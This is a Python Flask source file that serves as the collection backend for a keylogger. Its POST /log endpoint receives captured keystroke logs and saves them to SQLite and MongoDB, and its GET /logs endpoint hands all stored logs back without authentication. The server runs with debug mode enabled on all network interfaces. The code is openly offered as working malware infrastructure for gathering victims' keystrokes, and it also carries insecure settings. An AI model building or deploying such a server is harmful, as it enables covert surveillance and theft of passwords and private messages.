from flask import Flask, request, jsonify
import sqlite3
import datetime
from pymongo import MongoClient

client = MongoClient("mongodb://localhost:27017/")
db = client.keylogger
logs_collection = db.logs

app = Flask(__name__)

def create_db():
    conn = sqlite3.connect('keylogger.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (timestamp TEXT, log_data TEXT)''')
    conn.commit()
    conn.close()

def save_log_to_db(log_data):
    timestamp = datetime.datetime.now().isoformat()  # Fix here

    try:
        conn = sqlite3.connect('keylogger.db')
        c = conn.cursor()
        c.execute("INSERT INTO logs (timestamp, log_data) VALUES (?, ?)",
                  (timestamp, log_data))
        conn.commit()
    except sqlite3.Error as e:
        print(f"Error saving log to SQLite: {e}")
    finally:
        conn.close()

    try:
        logs_collection.insert_one({
            "timestamp": timestamp,
            "log_data": log_data
        })
        print("Log saved to MongoDB")
    except Exception as e:
        print(f"MongoDB Error: {e}")

@app.route('/log', methods=['POST'])
def log_key():
    data = request.json
    log_data = data.get("log")
    
    if log_data:
        save_log_to_db(log_data)
        return jsonify({"status": "success", "message": "Log saved!"}), 200
    else:
        return jsonify({"status": "error", "message": "No log data provided!"}), 400
    
@app.route('/logs', methods=['GET'])
def get_logs():
    conn = sqlite3.connect('keylogger.db')
    c = conn.cursor()
    c.execute("SELECT * FROM logs")
    logs = c.fetchall()
    conn.close()
    return jsonify(logs)

if __name__ == '__main__':
    create_db()
    app.run(debug=True, host="0.0.0.0", port=5008)
